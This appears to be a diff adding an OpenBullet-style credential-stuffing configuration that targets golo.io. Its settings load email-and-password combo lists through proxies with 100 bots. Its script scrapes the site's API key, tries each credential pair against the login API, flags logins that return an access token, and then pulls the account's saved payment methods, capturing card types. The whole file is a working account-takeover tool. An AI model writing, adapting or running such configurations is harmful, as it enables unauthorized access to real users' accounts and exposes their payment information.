@@ -1,0 +1,71 @@
+[SETTINGS]
+{
+  "Name": "Golo.io",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-11T11:43:26.2865106-04:00",
+  "AdditionalInfo": "",
+  "Author": "Howzi",
+  "Version": "1.1.2",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "8",
+      "Id": 678993836
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#get_api_key REQUEST GET "https://www.golo.io/en-ca/login/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)" 
+
+#key_check KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Retry OR 
+    KEY "We're currently experiencing technical difficulties. We'll be back soon!" 
+
+#parse_api-key PARSE "<SOURCE>" LR "\"API_KEY\":\"" "\"" -> VAR "api-key" 
+
+#login REQUEST POST "https://www.golo.io/api/v1/auth/login" 
+  CONTENT "{\"credentials\":{\"email\":\"<USER>\",\"password\":\"<PASS>\"},\"type\":\"default\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)" 
+  HEADER "device-id: 00000000-0000-0000-0000-000000000000" 
+
+#key_check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "success\":false" 
+  KEYCHAIN Success OR 
+    KEY "accessToken" 
+
+#parse_id PARSE "<SOURCE>" JSON "id" -> VAR "id" 
+
+#parse_token PARSE "<SOURCE>" JSON "token" -> VAR "token" 
+
+#get_payment_methods REQUEST GET "https://api.golo.io/payment-service/api/v1/payment_methods" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)" 
+  HEADER "API-KEY: <api-key>" 
+  HEADER "Authorization: Token token=<token>,user_id=<id>" 
+  HEADER "DEVICE-ID: 00000000-0000-0000-0000-000000000000" 
+
+#parse_card_type PARSE "<SOURCE>" JSON "card_type" Recursive=TRUE -> CAP "Payment Methods" 
+
